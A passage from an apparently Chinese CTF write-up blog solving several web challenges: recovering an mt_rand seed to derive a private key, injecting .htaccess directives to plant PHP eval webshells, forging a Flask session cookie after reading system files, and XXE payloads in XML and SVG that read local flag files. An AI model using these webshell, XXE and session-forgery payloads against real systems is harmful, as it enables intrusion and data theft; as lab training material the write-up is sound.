&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    else if($Private_key != &#x27;*************&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if($Private_key === &#x27;************&#x27;)&#123;</span><br><span class="line">        $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; </span><br><span class="line">        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">        mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">// genarate public_key </span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, (0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></pre></td></tr></table></figure><p>代码审计一下，我们需要拿到私钥，为什么还给出了公钥，就是长度不够，因为我们可以通过公钥来破解随机数种子，函数mt_rand产生的是伪随机数，伪随机的问题我们在前面有碰到过一题，差不多都是类似的。</p><p>爆破随机数序列，与前面的有点不同，但是原理一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3=str1[::-<span class="number">1</span>]<span class="comment">#逆序</span></span><br><span class="line">length1=<span class="built_in">len</span>(str1)</span><br><span class="line">length2=<span class="built_in">len</span>(str2)</span><br><span class="line">r=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length2):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length1):</span><br><span class="line">        <span class="keyword">if</span> str2[i]==str1[j]:</span><br><span class="line">            r+=<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(length1-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="comment">#36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span></span><br></pre></td></tr></table></figure><p>得到种子后，再破解私钥。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line"><span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到私钥，这里还有要求php版本要大于5.2.1。</p><h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看起来简单明了，允许我们写入文件，但是只能写入文件名为<code>[a-z.]*</code>的文件，文件内容也有限制，并且文件内容最后还会加上一串字符串干扰。</p><p>最后面加上的字符串可以通过#注释符绕过，同时通过\将换行符的\转义，我们尝试写入<code>.htaccess</code>文件，但是文件内容被限制了，我们读一下[官方文档](<a href="https://www.php.net/manual/zh/ini.list.php">PHP: php.ini 配置选项列表 - Manual</a>)看看.htaccess还有什么功能。</p><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>查找所有可修改范围为<code>PHP_INI_ALL</code>即<code>PHP_INI_PERDIR</code>的配置项，我们可以注意到这样一个选项<code>include_path</code>.</p><p>控制这个选项就可以控制include的fl3g.php可以是任意目录下的某个文件，还需要控制fl3g.php，需要用到error_log这个选项，利用error_log写入log文件到/tmp/fl3g.php，再设置include_path=/tmp就可以使index.php可以包含我们想要的文件，我们通过设置include_path为不存在的文件夹即可触发报错。</p><p>但是error_log的默认的内容是htmlentities，导致我们的插入可执行的php代码，这里就需要绕过转义。</p><p>[通过设置编码绕过](<a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack</a> 2019/l33t-hoster/l33t-hoster.md)</p><p>解题：</p><p>我们先写入error_log相关配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line"># </span><br></pre></td></tr></table></figure><p>其中32767是所有常量加起来的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?filename=.htaccess&amp;content=php_value%20error_log%20/tmp/fl3g.php%0d%0aphp_value%20error_reporting%2032767%0d%0aphp_value%20include_path%20%22+ADw?php%20eval($_GET[1])+ADs%20+AF8AXw-halt+AF8-compiler()+ADs%22%0d%0a#%20\</span><br></pre></td></tr></table></figure><p>再访问index.php，触发error_log写到/tmp/fl3g.php</p><p>再写入新的配置，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value include_path &quot;/tmp&quot;</span><br><span class="line"># </span><br></pre></td></tr></table></figure><p>将编码设置转为UTF-7,这样shell就能够被顺利的解析出来了。</p><p>同时利用<code>include_path</code>将我们刚刚生成的文件给包含/tmp/fl3g</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value include_path &quot;/tmp&quot;%0d%0aphp_value zend.multibyte 1%0d%0aphp_value zend.script_encoding &quot;UTF-7&quot;%0d%0a# \</span><br></pre></td></tr></table></figure><p>最后访问，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?2=evilcode</span><br></pre></td></tr></table></figure><p>即可getshell。</p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二:"></a>解法二:</h3><p>设置pcre的一些选项可以导致文件名判断失效，从而直接写入<code>fl3g.php</code></p><p>判断条件为：<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code></p><p>所以通过php_value 设置正则回朔次数来使正则匹配的结果返回为false而不是0或1，默认的回朔次数比较大，可以设成0，即可绕过前面的正则匹配，后面再通过伪协议写入一句话木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit    0</span><br><span class="line">php_value auto_append_file    &quot;.htaccess&quot;</span><br><span class="line">php_value pcre.jit   0</span><br><span class="line">#aa&lt;?php eval($_GET[&#x27;a&#x27;]);?&gt;\</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=php_value pcre.backtrack_limit    0</span><br><span class="line">php_value auto_append_file    &quot;.htaccess&quot;</span><br><span class="line">php_value pcre.jit   0</span><br><span class="line">#aa&lt;?php eval($_GET[&#x27;a&#x27;]);?&gt;\</span><br></pre></td></tr></table></figure><h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[1]); ?&gt;\</span><br></pre></td></tr></table></figure><p>通过\连接file绕过file正则匹配，同时通过#注释符写入一句话木马，再通过文件包含解析一句话木马，成功getshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_POST[1])%3b%20%3f%3E\</span><br></pre></td></tr></table></figure><p>执行一次。就要重新生成一次.htaccess，多试几次就可以成功连接了。</p><h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>尝试伪协议读取行不通，试一下直接读取，居然可以。</p><p>抓包看一下，又是cookie通过flask session加密。</p><p>到JWT解密一下，解密得到www-data，如果要伪造flask session，我们需要得到SECRET_KEY，尝试读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/environ</span><br></pre></td></tr></table></figure><p>发现app尝试读取一下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/app.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>我们只需让session中username的值为fuck即可得到flag，但是想要伪装flask session我们需要得到密钥，可以看到他的密钥生成方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)</span><br></pre></td></tr></table></figure><p>又是伪随机数，函数<code>uuid.getnode()</code>，用于获取Mac地址并将其转换为整数。我们需要知道Mac地址，读取一下，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/eth0/address</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:10:85:42</span><br></pre></td></tr></table></figure><p>然后得出密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac108542</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br><span class="line"><span class="comment">#61.9848256705</span></span><br></pre></td></tr></table></figure><p>这里记得使用python2，因为python3他们之间保留的位数不同。</p><p>然后再使用我们前几天的脚本伪造。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;61.9848256705&#x27;</span> -t <span class="string">&quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;</span></span><br><span class="line"><span class="comment">#eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.YPaPRQ.ZzgERSnKgeQMtiIU9NVbft1lJw4</span></span><br></pre></td></tr></table></figure><p>修改session值后再访问/flag得到flag。</p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>—XXE注入</p><p>我们添加一个实体执行命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">    &lt;user&gt;</span><br><span class="line">        &lt;username&gt;bob&lt;/username&gt;</span><br><span class="line">        &lt;password&gt;passwd2&lt;/password&gt;</span><br><span class="line">        &lt;name&gt; Bob&lt;/name&gt;</span><br><span class="line">        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  </span><br><span class="line">        &lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class="line">        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">    &lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br></pre></td></tr></table></figure><p>存在waf，考虑编码绕过。通过utf16编码绕过，可以另存为保存设置编码，或者使用kali的命令将文件转换编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat c.xml | iconv -f UTF-8 -t UTF-16BE &gt; c16.xml</span><br></pre></td></tr></table></figure><p>上传文件后即可得到flag。</p><h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>首先了解一下SVG是什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SVG是一种图像 文件格式 ，它的 英文 全称为Scalable Vector Graphics，意思为可缩放的 矢量图形 。 它是基于 XML （Extensible Markup Language），由World Wide Web Consortium（ W3C ）联盟进行开发的。</span><br></pre></td></tr></table></figure><p>这题也是XXE注入，payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span>      &lt;!--从内存读取当前工作目录下的文件--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="comment">&lt;!--通过改位置寻找flag -- &gt;</span></span><br><span class="line"><span class="comment">&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure><p>另存为xml格式，上传即可得到flag。</p><h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 